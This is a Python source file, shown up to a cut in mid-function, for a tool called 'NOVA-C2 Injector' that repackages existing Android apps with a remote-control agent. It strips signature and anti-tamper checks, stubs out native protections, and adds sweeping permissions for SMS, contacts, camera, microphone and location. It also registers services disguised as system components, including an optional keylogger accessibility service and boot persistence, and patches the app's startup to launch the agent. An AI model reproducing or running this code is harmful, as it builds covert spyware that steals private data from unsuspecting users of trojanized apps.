#!/usr/bin/env python3
"""NOVA-C2 Injector — Inject agent into existing APK"""
import os, sys, json, shutil, subprocess, re, zipfile, tempfile, urllib.request, hashlib, textwrap, time, platform, uuid
from pathlib import Path

def _init_colors():
    try:
        import ctypes
        h = ctypes.windll.kernel32.GetStdHandle(-11)
        m = ctypes.c_uint32()
        if ctypes.windll.kernel32.GetConsoleMode(h, ctypes.byref(m)):
            ctypes.windll.kernel32.SetConsoleMode(h, m.value | 4)
    except:
        pass
    return type('C', (), {
        'RED': '\033[91m', 'GREEN': '\033[92m', 'YELLOW': '\033[93m',
        'CYAN': '\033[96m', 'WHITE': '\033[97m', 'GREY': '\033[90m',
        'BOLD': '\033[1m', 'RESET': '\033[0m'
    })()

C = _init_colors()

ROOT = Path(__file__).parent.absolute()
TOOLS_DIR = ROOT / '.tools'
TOOLS_DIR.mkdir(exist_ok=True)

APKTOOL_JAR = TOOLS_DIR / 'apktool_2.9.3.jar'
BAKSMALI_JAR = TOOLS_DIR / 'baksmali-2.5.2.jar'
SMALI_JAR = TOOLS_DIR / 'smali-2.5.2.jar'

APKTOOL_URL = 'https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.9.3.jar'
BAKSMALI_URL = 'https://bitbucket.org/JesusFreke/smali/downloads/baksmali-2.5.2.jar'
SMALI_URL = 'https://bitbucket.org/JesusFreke/smali/downloads/smali-2.5.2.jar'

ANDROID_SDK = None
for candidate in [
    os.environ.get('ANDROID_HOME'),
    Path(r'C:\Users\marua\AppData\Local\Android\Sdk'),
    Path.home() / 'Android/Sdk',
    Path('/opt/android-sdk'),
]:
    if candidate:
        p = Path(candidate)
        if p.exists():
            ANDROID_SDK = p
            break

def _find_tool(name):
    if not ANDROID_SDK:
        return None
    for bt in ['37.0.0', '36.1.0', '36.0.0', '34.0.0']:
        for ext in ['', '.exe', '.bat']:
            p = ANDROID_SDK / 'build-tools' / bt / (name + ext)
            if p.exists():
                return str(p)
    return None

AAPT2 = _find_tool('aapt2')
ZIPALIGN = _find_tool('zipalign')
APKSIGNER = _find_tool('apksigner')
JAVA = shutil.which('java')
JARSIGNER = shutil.which('jarsigner')
KEYTOOL = shutil.which('keytool')

def _download(url, dest):
    if dest.exists():
        return True
    print(f'{C.YELLOW}[!] Downloading {dest.name}...{C.RESET}')
    try:
        urllib.request.urlretrieve(url, str(dest))
        print(f'{C.GREEN}[+] Downloaded {dest.name}{C.RESET}')
        return True
    except Exception as e:
        print(f'{C.RED}[X] Download failed: {e}{C.RESET}')
        return False

def ensure_tools():
    """Ensure apktool, baksmali, smali are available. Download if needed."""
    if not JAVA:
        print(f'{C.RED}[X] Java not found on PATH. Required for apktool/baksmali.{C.RESET}')
        return False

    missing = []
    if not APKTOOL_JAR.exists():
        missing.append(('apktool', APKTOOL_URL, APKTOOL_JAR))
    if not BAKSMALI_JAR.exists():
        missing.append(('baksmali', BAKSMALI_URL, BAKSMALI_JAR))
    if not SMALI_JAR.exists():
        missing.append(('smali', SMALI_URL, SMALI_JAR))

    if missing:
        print(f'{C.YELLOW}[!] Required tools not found:{C.RESET}')
        for name, url, path in missing:
            print(f'     {C.CYAN}{name}{C.RESET}: {path.name}')
        auto = os.environ.get('NOVA_AUTO_DOWNLOAD', '') == '1'
        yn = 'y'
        if not auto:
            try:
                yn = input(f'{C.CYAN}-► Download missing tools? (Y/n): {C.RESET}').strip().lower()
            except (EOFError, KeyboardInterrupt):
                yn = 'y'
        if yn != 'n':
            for name, url, path in missing:
                if not _download(url, path):
                    return False
        else:
            print(f'{C.RED}[X] Cannot proceed without tools.{C.RESET}')
            return False

    for jar in [APKTOOL_JAR, BAKSMALI_JAR, SMALI_JAR]:
        if not jar.exists():
            print(f'{C.RED}[X] Missing: {jar.name}{C.RESET}')
            return False

    return True

def _run_java(jar, args, timeout=120):
    cmd = [JAVA, '-jar', str(jar)] + args
    return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)

def decompile_apk(apk_path, output_dir, skip_dex=False):
    flags = ['d', str(apk_path), '-o', str(output_dir), '--no-debug-info', '--keep-broken-res']
    if skip_dex:
        flags.insert(1, '-s')  # skip DEX decompilation
    print(f'{C.CYAN}[+] Decompiling {apk_path.name}...{C.RESET}')
    r = _run_java(APKTOOL_JAR, flags, timeout=180)
    if r.returncode != 0:
        print(f'{C.RED}[X] apktool failed: {r.stderr[:500]}{C.RESET}')
        return False
    print(f'{C.GREEN}[+] Decompiled to {output_dir}{C.RESET}')
    return True

def recompile_apk(input_dir, output_path):
    print(f'{C.CYAN}[+] Recompiling...{C.RESET}')
    args = ['b', str(input_dir), '-o', str(output_path), '--use-aapt2']
    r = _run_java(APKTOOL_JAR, args, timeout=180)
    if r.returncode != 0:
        print(f'{C.RED}[X] Recompilation failed: {r.stderr[:500]}{C.RESET}')
        return False
    print(f'{C.GREEN}[+] Recompiled to {output_path.name}{C.RESET}')
    return True

def build_agent_apk():
    """Build the agent APK using Gradle. Returns path to built APK or None."""
    print(f'{C.CYAN}[+] Building agent payload with Gradle...{C.RESET}')
    env = os.environ.copy()
    env['JAVA_HOME'] = env.get('JAVA_HOME', str(Path(shutil.which('java')).parent.parent))

    r = subprocess.run(
        [str(ROOT / 'gradlew.bat'), 'assembleRelease', '--no-daemon', '-q'],
        cwd=str(ROOT), env=env, capture_output=True, text=True, timeout=600
    )
    if r.returncode != 0:
        print(f'{C.RED}[X] Gradle build failed: {r.stderr[:500]}{C.RESET}')
        return None

    apks = list((ROOT / 'app/build/outputs/apk/release').glob('*.apk'))
    if not apks:
        print(f'{C.RED}[X] No APK found after build{C.RESET}')
        return None
    return apks[0]

def extract_classes_dex(apk_path, output_dir):
    """Extract classes.dex from our agent APK and disassemble to smali."""
    print(f'{C.CYAN}[+] Extracting classes.dex from agent...{C.RESET}')
    try:
        with zipfile.ZipFile(apk_path, 'r') as z:
            dex_files = [n for n in z.namelist() if n.endswith('.dex')]
            if not dex_files:
                print(f'{C.RED}[X] No DEX files in agent APK{C.RESET}')
                return None
            dex_paths = []
            for d in dex_files:
                out = output_dir / d
                z.extract(d, output_dir)
                dex_paths.append(out)
                print(f'{C.GREEN}[+] Extracted {d}{C.RESET}')

            smali_out = output_dir / 'agent_smali'
            smali_out.mkdir(exist_ok=True)
            for dex_path in dex_paths:
                dex_name = dex_path.stem
                dex_smali = smali_out / dex_name
                print(f'{C.CYAN}[+] Disassembling {dex_path.name}...{C.RESET}')
                r = _run_java(BAKSMALI_JAR, ['d', str(dex_path), '-o', str(dex_smali)], timeout=120)
                if r.returncode != 0:
                    print(f'{C.YELLOW}[!] baksmali warning for {dex_path.name}: {r.stderr[:300]}{C.RESET}')
            return smali_out
    except Exception as e:
        print(f'{C.RED}[X] Failed to extract DEX: {e}{C.RESET}')
        return None

def _find_app_class(target_dir):
    """Find the Application class smali file from the manifest."""
    mf = target_dir / 'AndroidManifest.xml'
    if not mf.exists():
        return None
    content = mf.read_text(encoding='utf-8')
    m = re.search(r'<application\s[^>]*android:name="([^"]+)"', content)
    if not m:
        return None
    app_class = m.group(1)
    if app_class.startswith('.'):
        pkg = re.search(r'package="([^"]+)"', content)
        if pkg:
            app_class = pkg.group(1) + app_class

    app_path = app_class.replace('.', '/') + '.smali'
    for d in _find_smali_dirs(target_dir):
        candidate = d / app_path
        if candidate.exists():
            return candidate
        # Try just the class name in case of package matching
        simple = d / (app_class.split('.')[-1] + '.smali')
        if simple.exists():
            return simple
    return None


ANTI_TAMPER_PATCHES = [
    # Pattern: killProcess(Process.myPid()) → nop
    {
        'name': 'process_kill',
        'search': re.compile(
            r'(invoke-static\s*\{\},\s*Landroid/os/Process;->myPid\(\)I\s*\n'
            r'\s*move-result\s+\w+\s*\n'
            r'\s*invoke-static\s*\{\w+\},\s*Landroid/os/Process;->killProcess\(I\)V)',
            re.MULTILINE
        ),
        'replace': '# patched: killProcess removed'
    },
    # Pattern: System.exit(0) → nop
    {
        'name': 'system_exit',
        'search': re.compile(
            r'invoke-static\s*\{[^}]*\},\s*Ljava/lang/System;->exit\(I\)V',
        ),
        'replace': '# patched: System.exit removed'
    },
    # Pattern: System.exit(n) via literal
    {
        'name': 'system_exit_literal',
        'search': re.compile(
            r'const/4\s+\w+,\s*0x0+\s*\n\s*invoke-static\s*\{\w+\},\s*Ljava/lang/System;->exit\(I\)V',
        ),
        'replace': '# patched: System.exit removed'
    },
    # Pattern: getPackageInfo with signatures
    {
        'name': 'signature_check',
        'search': re.compile(
            r'(getPackageInfo\([^)]+\)[\s\S]{0,200}?signatures|'
            r'signatures[\s\S]{0,200}?getPackageInfo)',
            re.IGNORECASE
        ),
        'replace': '# patched: signature check removed'
    },
    # Pattern: finishAffinity() 
    {
        'name': 'finish_affinity',
        'search': re.compile(r'invoke-virtual\s*\{[^}]*\},\s*L\w+;->finishAffinity\(\)V'),
        'replace': '# patched: finishAffinity removed'
    },
]


def patch_anti_tamper(target_dir):
    """Scan and patch common anti-tamper patterns in host smali.
    Returns list of patches applied."""
    applied = []
    app_smali = _find_app_class(target_dir)
    if not app_smali:
        print(f'{C.YELLOW}[!] No Application class found for anti-tamper scan{C.RESET}')
        return applied

    content = app_smali.read_text(encoding='utf-8')
    original = content

    # Apply known patterns
    for p in ANTI_TAMPER_PATCHES:
        if p['search'].search(content):
            content = p['search'].sub(p['replace'], content)
            applied.append(p['name'])

    # Smart patches: find methods that end with killProcess/exit and remove the calls
    lines = content.split('\n')
    new_lines = []
    skip_next = 0
    for i, line in enumerate(lines):
        if skip_next > 0:
            skip_next -= 1
            continue
        # Detect return-void right after killProcess
        stripped = line.strip()
        if 'killProcess' in stripped or 'System;->exit' in stripped:
            # Skip this line and the next return-void if present
            new_lines.append(f'    # patched: {stripped[:60]}')
            if i + 1 < len(lines) and 'return-void' in lines[i + 1]:
                # Don't skip return-void — keep it for method correctness
                pass
            continue
        new_lines.append(line)

    if new_lines != lines:
        content = '\n'.join(new_lines)
        if 'process_kill' not in applied:
            applied.append('process_kill_smart')

    # Special: patch sp() method to be a no-op (DETool loader)
    sp_pattern = re.compile(
        r'(\.method public static sp\(\)V[\s\S]*?\.end method)',
        re.MULTILINE
    )
    if sp_pattern.search(content):
        content = sp_pattern.sub(
            '.method public static sp()V\n    .registers 1\n    return-void\n.end method',
            content
        )
        applied.append('sp_method_noop')

    # Special: patch il() method to return false (maps checker)
    il_pattern = re.compile(
        r'(\.method public static il\(\)Z[\s\S]*?\.end method)',
        re.MULTILINE
    )
    if il_pattern.search(content):
        content = il_pattern.sub(
            '.method public static il()Z\n    .registers 2\n    const/4 v0, 0x0\n    return v0\n.end method',
            content
        )
        applied.append('il_method_noop')

    # Patch attachBaseContext: comment out N.l() and N.r() native calls
    attach_lines = content.split('\n')
    new_attach = []
    in_attach = False
    patched_attach = False
    nested = 0
    for line in attach_lines:
        stripped = line.strip()
        if '.method protected attachBaseContext' in stripped:
            in_attach = True
            nested = 0
            new_attach.append(line)
            continue
        if in_attach:
            if stripped.startswith('.end method'):
                in_attach = False
                new_attach.append(line)
                continue
            # Skip N.l() and N.r() calls
            if ('N;->l(' in stripped or 'N;->r(' in stripped) and 'invoke-static' in stripped:
                new_attach.append(f'    # patched: skipped native call')
                patched_attach = True
                continue
        new_attach.append(line)
    if patched_attach:
        content = '\n'.join(new_attach)
        applied.append('attachBaseContext_skip_native')

    # Patch onCreate: comment out N.ra() native call
    create_lines = content.split('\n')
    new_create = []
    in_create = False
    patched_create = False
    for line in create_lines:
        stripped = line.strip()
        if '.method public onCreate' in stripped:
            in_create = True
            new_create.append(line)
            continue
        if in_create:
            if stripped.startswith('.end method'):
                in_create = False
                new_create.append(line)
                continue
            if ('N;->ra(' in stripped) and 'invoke-static' in stripped:
                new_create.append(f'    # patched: skipped native call')
                patched_create = True
                continue
        new_create.append(line)
    if patched_create:
        content = '\n'.join(new_create)
        applied.append('onCreate_skip_native')

    # Patch N class: replace all native methods with stub Java implementations
    for smali_dir in _find_smali_dirs(target_dir):
        n_smali = smali_dir / 's' / 'h' / 'e' / 'l' / 'l' / 'N.smali'
        if n_smali and n_smali.exists():
            n_content = n_smali.read_text(encoding='utf-8')
            n_orig = n_content

            # Replace native method al(...) -> return p1 (original classloader)
            n_content = re.sub(
                r'\.method public static native al\([^)]*\)Ljava/lang/ClassLoader;[\s\S]*?\.end method',
                '.method public static al(Ljava/lang/ClassLoader;Landroid/content/pm/ApplicationInfo;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/ClassLoader;\n    .registers 5\n    return-object p1\n.end method',
                n_content
            )

            # Replace native method b2b([BI)[B -> return p1 (original bytes)
            n_content = re.sub(
                r'\.method public static native b2b\([^)]*\)\[B[\s\S]*?\.end method',
                '.method public static b2b([BI)[B\n    .registers 3\n    return-object p0\n.end method',
                n_content
            )

            # Replace native method l(Application, String)Z -> return true
            n_content = re.sub(
                r'\.method public static native l\([^)]*\)Z[\s\S]*?\.end method',
                '.method public static l(Landroid/app/Application;Ljava/lang/String;)Z\n    .registers 3\n    const/4 v0, 0x1\n    return v0\n.end method',
                n_content
            )

            # Replace native method m(String;I)V -> no-op
            n_content = re.sub(
                r'\.method public static native m\([^)]*\)V[\s\S]*?\.end method',
                '.method public static m(Ljava/lang/String;I)V\n    .registers 3\n    return-void\n.end method',
                n_content
            )

            # Replace native method r(Application, String)Z -> return true
            n_content = re.sub(
                r'\.method public static native r\([^)]*\)Z[\s\S]*?\.end method',
                '.method public static r(Landroid/app/Application;Ljava/lang/String;)Z\n    .registers 3\n    const/4 v0, 0x1\n    return v0\n.end method',
                n_content
            )

            # Replace native method ra(Application, String)Z -> return true
            n_content = re.sub(
                r'\.method public static native ra\([^)]*\)Z[\s\S]*?\.end method',
                '.method public static ra(Landroid/app/Application;Ljava/lang/String;)Z\n    .registers 3\n    const/4 v0, 0x1\n    return v0\n.end method',
                n_content
            )

            # Replace native method sa(String;String)V -> no-op
            n_content = re.sub(
                r'\.method public static native sa\([^)]*\)V[\s\S]*?\.end method',
                '.method public static sa(Ljava/lang/String;Ljava/lang/String;)V\n    .registers 3\n    return-void\n.end method',
                n_content
            )

            if n_content != n_orig:
                n_smali.write_text(n_content, encoding='utf-8')
                applied.append('N_native_stubs')
                print(f'{C.GREEN}[+] Patched N class native methods -> stubs{C.RESET}')

            # Also patch A.smali (AppComponentFactory) to not call N.al()
            a_smali = smali_dir / 's' / 'h' / 'e' / 'l' / 'l' / 'A.smali'
            if a_smali.exists():
                a_content = a_smali.read_text(encoding='utf-8')
                a_orig = a_content

                # Fix 1: Replace N.al() invoke+move-result with nop/nop
                # (was 'return-object p1' which returns ClassLoader instead of Application -> VerifyError)
                a_content = re.sub(
                    r'invoke-static\s*\{[^}]*\},\s*Ls/h/e/l/l/N;->al\([^)]*\)Ljava/lang/ClassLoader;\s*\n\s*move-result-object p1',
                    'nop\n    nop',
                    a_content
                )

                # Fix 2: Replace native al() declaration with Java stub
                a_content = re.sub(
                    r'\.method public static native al\([^)]*\)Ljava/lang/ClassLoader;[\s\S]*?\.end method',
                    '.method public static al(Ljava/lang/ClassLoader;Landroid/content/pm/ApplicationInfo;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/ClassLoader;\n    .registers 5\n    return-object p1\n.end method',
                    a_content
                )

                if a_content != a_orig:
                    a_smali.write_text(a_content, encoding='utf-8')
                    applied.append('A_no_native')

            # Patch N.smali <clinit>: replace System.load calls with nops
            if n_smali and n_smali.exists():
                n2_content = n_smali.read_text(encoding='utf-8')
                n2_orig = n2_content
                # Replace all System.load/loadLibrary calls with nop
                n2_content = n2_content.replace(
                    'invoke-static {v0}, Ljava/lang/System;->load(Ljava/lang/String;)V',
                    '# patched: System.load'
                )
                n2_content = n2_content.replace(
                    'invoke-static {v0}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V',
                    '# patched: System.loadLibrary'
                )
                if n2_content != n2_orig:
                    n_smali.write_text(n2_content, encoding='utf-8')
                    applied.append('N_clinit_patched')
                    print(f'{C.GREEN}[+] Patched N class <clinit> System.load calls -> nops{C.RESET}')

            # Patch C.smali: replace native i(I)V with Java stub
            c_smali = smali_dir / 's' / 'h' / 'e' / 'l' / 'l' / 'C.smali'
            if c_smali and c_smali.exists():
                c_content = c_smali.read_text(encoding='utf-8')
                c_orig = c_content
                c_content = re.sub(
                    r'\.method public static native i\(I\)V[\s\S]*?\.end method',
                    '.method public static i(I)V\n    .registers 2\n    return-void\n.end method',
                    c_content
                )
                if c_content != c_orig:
                    c_smali.write_text(c_content, encoding='utf-8')
                    applied.append('C_native_stub')
                    print(f'{C.GREEN}[+] Patched C class native i() -> stub{C.RESET}')

            # Create stub for FlashApplication (loaded from encrypted native code)
            flash_dir = smali_dir / 'com' / 'centaurus' / 'moras'
            flash_dir.mkdir(parents=True, exist_ok=True)
            flash_smali = flash_dir / 'FlashApplication.smali'
            if not flash_smali.exists():
                flash_smali.write_text(
                    '.class public Lcom/centaurus/moras/FlashApplication;\n'
                    '.super Ls/h/e/l/l/S;\n'
                    '.source "FlashApplication"\n'
                    '\n'
                    '# created by NOVA-C2 injector - stub for missing native-loaded class\n'
                    '.method public constructor <init>()V\n'
                    '    .registers 1\n'
                    '    invoke-direct {p0}, Ls/h/e/l/l/S;-><init>()V\n'
                    '    return-void\n'
                    '.end method\n',
                    encoding='utf-8'
                )
                applied.append('FlashApplication_stub')
                print(f'{C.GREEN}[+] Created stub FlashApplication -> extends S{C.RESET}')

            break

    # Also make l() a no-op to prevent native lib extraction entirely
    l_noop = re.compile(
        r'(\.method public static l\(Landroid/content/Context;\)V[\s\S]*?\.end method)',
        re.MULTILINE
    )
    if l_noop.search(content) and 'l_method_noop' not in applied:
        content = l_noop.sub(
            '.method public static l(Landroid/content/Context;)V\n    .registers 2\n    return-void\n.end method',
            content
        )
        applied.append('l_method_noop')

    if content != original:
        app_smali.write_text(content, encoding='utf-8')
        print(f'{C.GREEN}[+] Anti-tamper patches applied: {", ".join(applied)}{C.RESET}')
    elif not applied:
        print(f'{C.YELLOW}[!] No anti-tamper patterns found{C.RESET}')
    return applied


def _find_smali_dirs(target_dir):
    """Find all smali directories in the decompiled target APK."""
    dirs = []
    for d in sorted(target_dir.iterdir()):
        if d.is_dir() and (d.name.startswith('smali') or d.name == 'smali'):
            dirs.append(d)
    return dirs if dirs else [target_dir / 'smali']

def _read_android_manifest(target_dir):
    """Read the text-form AndroidManifest.xml (apktool decodes it)."""
    mf = target_dir / 'AndroidManifest.xml'
    if not mf.exists():
        return None
    return mf.read_text(encoding='utf-8')

def _write_android_manifest(target_dir, content):
    mf = target_dir / 'AndroidManifest.xml'
    mf.write_text(content, encoding='utf-8')

def _get_min_sdk(target_dir):
    """Extract minSdkVersion from apktool.yml."""
    yml = target_dir / 'apktool.yml'
    if yml.exists():
        for line in yml.read_text().split('\n'):
            m = re.search(r'''minSdkVersion:\s*['"]?(\d+)''', line)
            if m:
                return int(m.group(1))
    return 21

def _needs_multidex(min_sdk, dex_count):
    """APK needs multi-dex if DEX > 1 and minSdk < 21."""
    if dex_count > 1 and min_sdk and min_sdk < 21:
        return True
    return False

def patch_manifest(target_dir, features):
    """Add permissions, services, receivers to AndroidManifest.xml."""
    mf_path = target_dir / 'AndroidManifest.xml'
    if not mf_path.exists():
        print(f'{C.RED}[X] AndroidManifest.xml not found in decompiled APK{C.RESET}')
        return False

    content = mf_path.read_text(encoding='utf-8')

    additions = []

    ALWAYS_PERMS = [
        'android.permission.INTERNET',
        'android.permission.ACCESS_NETWORK_STATE',
        'android.permission.FOREGROUND_SERVICE',
        'android.permission.FOREGROUND_SERVICE_DATA_SYNC',
        'android.permission.RECEIVE_BOOT_COMPLETED',
        'android.permission.WAKE_LOCK',
        'android.permission.SYSTEM_ALERT_WINDOW',
        'android.permission.REQUEST_INSTALL_PACKAGES',
        'android.permission.POST_NOTIFICATIONS',
        'android.permission.ACCESS_FINE_LOCATION',
        'android.permission.ACCESS_COARSE_LOCATION',
        'android.permission.CAMERA',
        'android.permission.RECORD_AUDIO',
        'android.permission.READ_CONTACTS',
        'android.permission.READ_SMS',
        'android.permission.READ_CALL_LOG',
        'android.permission.READ_PHONE_STATE',
        'android.permission.READ_EXTERNAL_STORAGE',
        'android.permission.WRITE_EXTERNAL_STORAGE',
        'android.permission.SEND_SMS',
        'android.permission.CALL_PHONE',
        'android.permission.ACCESS_WIFI_STATE',
        'android.permission.CHANGE_WIFI_STATE',
        'android.permission.QUERY_ALL_PACKAGES',
        'android.permission.MANAGE_EXTERNAL_STORAGE',
        'android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS',
        'android.permission.DISABLE_KEYGUARD',
        'android.permission.EXPAND_STATUS_BAR',
        'android.permission.VIBRATE',
    ]

    perms_added = 0
    for perm in ALWAYS_PERMS:
        if perm not in content:
            tag = f'    <uses-permission android:name="{perm}"/>'
            if 'maxSdkVersion' not in perm and perm.endswith('EXTERNAL_STORAGE'):
                tag = f'    <uses-permission android:name="{perm}" android:maxSdkVersion="32"/>'
            additions.append(tag)
            perms_added += 1

    features_added = 0
    for hw in ['android.hardware.camera', 'android.hardware.camera.autofocus',
               'android.hardware.microphone', 'android.hardware.location.gps',
               'android.hardware.location', 'android.hardware.telephony',
               'android.hardware.wifi']:
        tag = f'    <uses-feature android:name="{hw}" android:required="false"/>'
        if tag not in content:
            additions.append(tag)
            features_added += 1

    svc_block = '''
    <service
        android:name="com.openaccess.sdk.service.SystemNetworkService"
        android:enabled="true"
        android:exported="false"
        android:foregroundServiceType="dataSync"/>
'''

    notif_block = '''
    <service
        android:name="com.openaccess.sdk.service.NotifService"
        android:enabled="true"
        android:exported="true"
        android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
        <intent-filter>
            <action android:name="android.service.notification.NotificationListenerService"/>
        </intent-filter>
    </service>
'''

    acc_block = '''
    <service
        android:name="com.android.internal.accessibility.CoreAccessibilityService"
        android:enabled="true"
        android:exported="true"
        android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
        <intent-filter>
            <action android:name="android.accessibilityservice.AccessibilityService"/>
        </intent-filter>
        <meta-data
            android:name="android.accessibilityservice"
            android:resource="@xml/accessibility_config"/>
    </service>
'''

    boot_block = '''
    <receiver
        android:name="com.android.internal.os.BootReceiver"
        android:enabled="true"
        android:exported="true"
        android:directBootAware="true">
        <intent-filter>
            <action android:name="android.intent.action.BOOT_COMPLETED"/>
            <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED"/>
            <action android:name="android.intent.action.REBOOT"/>
            <action android:name="com.android.internal.AOS_REVIVE"/>
        </intent-filter>
    </receiver>
'''

    provider_block = f'''
    <provider
        android:name="com.nova.c2.NovaProvider"
        android:authorities="{NOVA_PROVIDER_AUTHORITY}"
        android:exported="false"/>
'''

    blocks_to_add = [svc_block, notif_block, boot_block, provider_block]

    if features and ('keylogger' in features or 'accessibility' in features):
        blocks_to_add.append(acc_block)

    components_added = 0
    for block in blocks_to_add:
        name_match = re.search(r'android:name="([^"]+)"', block)
        if name_match:
            cls_name = name_match.group(1)
            if cls_name not in content:
                additions.append(block)
                components_added += 1

    perm_tags = [a for a in additions if a.strip().startswith('<uses-permission') or a.strip().startswith('<uses-feature')]
    comp_tags = [a for a in additions if not (a.strip().startswith('<uses-permission') or a.strip().startswith('<uses-feature'))]

    if perm_tags:
        block = '\n'.join(perm_tags) + '\n'
        content = re.sub(r'(<application\s)', block + '\\1', content, count=1)

    if comp_tags:
        block = '\n'.join(comp_tags) + '\n'
        content = re.sub(r'(</application>)', block + '\\1', content, count=1)

    content = re.sub(r'android:debuggable="true"', 'android:debuggable="false"', content)
    content = re.sub(r'android:allowBackup="true"', 'android:allowBackup="false"', content)
    content = re.sub(r'android:testOnly="true"', 'android:testOnly="false"', content)

    app_tag_match = re.search(r'<application\s', content)
    if app_tag_match and 'android:usesCleartextTraffic' not in content:
        content = content.replace('<application ', '<application android:usesCleartextTraffic="true"\n        ', 1)

    content = _cleanup_missing_providers(target_dir, content)

    mf_path.write_text(content, encoding='utf-8')

    _create_xml_resources(target_dir, features)

    print(f'{C.GREEN}[+] Manifest patched: {perms_added} permissions, {features_added} features, {components_added} components{C.RESET}')
    return True


def _cleanup_missing_providers(target_dir, manifest_content):
    """Remove <provider> entries from manifest when their smali class doesn't exist."""
    smali_dirs = _find_smali_dirs(target_dir)
    removed = 0
    # Find all <provider> blocks
    pattern = re.compile(
        r'<provider\s+([^>]*?)/>\s*',
        re.DOTALL
    )
    def provider_exists(match):
        nonlocal removed
        attrs = match.group(1)
        name_match = re.search(r'android:name="([^"]+)"', attrs)
        if name_match:
            cls_name = name_match.group(1)
            # Skip NovaProvider (our own)
            if cls_name == 'com.nova.c2.NovaProvider':
                return match.group(0)
            # Check if class exists as smali file
            cls_path = cls_name.replace('.', '/')
            exists = False
            for sd in smali_dirs:
                if (sd / f'{cls_path}.smali').exists():
                    exists = True
                    break
            if not exists:
                removed += 1
                print(f'{C.YELLOW}[!] Removed missing provider: {cls_name}{C.RESET}')
                return ''
        return match.group(0)

    result = pattern.sub(provider_exists, manifest_content)

    # Also handle multi-line <provider> blocks with inner elements
    pattern2 = re.compile(
        r'<provider\s+([^>]*)>\s*.*?</provider>',
        re.DOTALL
    )
    def provider_block_exists(match):
        nonlocal removed
        block = match.group(0)
        attrs = match.group(1)
        name_match = re.search(r'android:name="([^"]+)"', attrs)
        if name_match:
            cls_name = name_match.group(1)
            if cls_name == 'com.nova.c2.NovaProvider':
                return block
            cls_path = cls_name.replace('.', '/')
            exists = False
            for sd in smali_dirs:
                if (sd / f'{cls_path}.smali').exists():
                    exists = True
                    break
            if not exists:
                removed += 1
                print(f'{C.YELLOW}[!] Removed missing provider (block): {cls_name}{C.RESET}')
                return ''
        return block

    result = pattern2.sub(provider_block_exists, result)

    if removed:
        print(f'{C.YELLOW}[!] Removed {removed} providers with missing smali classes{C.RESET}')
    return result


def _create_xml_resources(target_dir, features):
    """Create XML resource files referenced by injected components."""
    res_xml = target_dir / 'res' / 'xml'
    res_xml.mkdir(parents=True, exist_ok=True)

    created = []
    accessibility_file = res_xml / 'accessibility_config.xml'
    if not accessibility_file.exists():
        accessibility_file.write_text('''<?xml version="1.0" encoding="utf-8"?>
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeAllMask"
    android:accessibilityFeedbackType="feedbackAllMask"
    android:accessibilityFlags="flagReportViewIds|flagRetrieveInteractiveWindows"
    android:canRetrieveWindowContent="true"
    android:canPerformGestures="true"
    android:notificationTimeout="100" />
''')
        created.append('accessibility_config.xml')

    network_cfg = target_dir / 'res' / 'xml' / 'network_security_config.xml'
    if not network_cfg.exists():
        network_cfg.write_text('''<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <base-config cleartextTrafficPermitted="true">
        <trust-anchors>
            <certificates src="system" />
            <certificates src="user" />
        </trust-anchors>
    </base-config>
</network-security-config>
''')
        created.append('network_security_config.xml')

    data_rules = target_dir / 'res' / 'xml' / 'data_extraction_rules.xml'
    if not data_rules.exists():
        data_rules.write_text('''<?xml version="1.0" encoding="utf-8"?>
<data-extraction-rules>
    <cloud-backup>
        <exclude domain="root" />
    </cloud-backup>
    <device-transfer>
        <exclude domain="root" />
    </device-transfer>
</data-extraction-rules>
''')
        created.append('data_extraction_rules.xml')

    file_paths = target_dir / 'res' / 'xml' / 'file_paths.xml'
    if not file_paths.exists():
        file_paths.write_text('''<?xml version="1.0" encoding="utf-8"?>
<paths>
    <cache-path name="cache" path="." />
    <external-path name="external" path="." />
    <files-path name="files" path="." />
</paths>
''')
        created.append('file_paths.xml')

    if created:
        print(f'{C.GREEN}[+] Created XML resources: {", ".join(created)}{C.RESET}')

def _find_injection_point(target_dir):
    """Find the best class to inject our bootstrap call into.
    Returns (smali_file_path, target_method) or None."""
    mf = target_dir / 'AndroidManifest.xml'
    if not mf.exists():
        return None

    content = mf.read_text(encoding='utf-8')

    priority_classes = []

    app_match = re.search(r'android:name="([^"]*)"', content)
    m = re.search(r'<application\s[^>]*android:name="([^"]+)"', content)
    if m:
        app_class = m.group(1)
        if app_class.startswith('.'):
            pkg = re.search(r'package="([^"]+)"', content)
            if pkg:
                app_class = pkg.group(1) + app_class
        priority_classes.append((app_class, 'onCreate'))

    act_matches = re.findall(r'<activity[^>]*android:name="([^"]+)"[^>]*>', content)
    for act in act_matches:
        if act in content:
            idx = content.index(act)
            snippet = content[idx:idx+600]
            if 'android.intent.action.MAIN' in snippet and 'android.intent.category.LAUNCHER' in snippet:
                if act.startswith('.'):
                    pkg = re.search(r'package="([^"]+)"', content)
                    if pkg:
                        act = pkg.group(1) + act
                priority_classes.append((act, 'onCreate'))

    prv_matches = re.findall(r'<provider[^>]*android:name="([^"]+)"', content)
    for prv in prv_matches:
        if prv.startswith('.'):
            pkg = re.search(r'package="([^"]+)"', content)
            if pkg:
                prv = pkg.group(1) + prv
        priority_classes.append((prv, 'onCreate'))

    for class_name, method in priority_classes:
        smali_path = class_name.replace('.', '/') + '.smali'
        for smali_dir in _find_smali_dirs(target_dir):
            candidate = smali_dir / smali_path
            if candidate.exists():
                return (candidate, method)
            alt = smali_dir / (class_name.split('.')[-1] + '.smali')
            if alt.exists():
                return (alt, method)

    for smali_dir in _find_smali_dirs(target_dir):
        for f in sorted(smali_dir.rglob('*.smali')):
            text = f.read_text(encoding='utf-8', errors='replace')
            if '.method public constructor <init>' in text:
                return (f, 'constructor')
            if '.method public onCreate' in text:
                return (f, 'onCreate')

    return None

def inject_bootstrap(smali_file, method_name, smali_dirs):
    """Inject NovaBootstrap.init(p0) BEFORE return-void, wrapped in try-catch.
    This is the Metasploit-standard approach: host app NEVER crashes from agent code."""
    if not smali_file or not smali_file.exists():
        return False

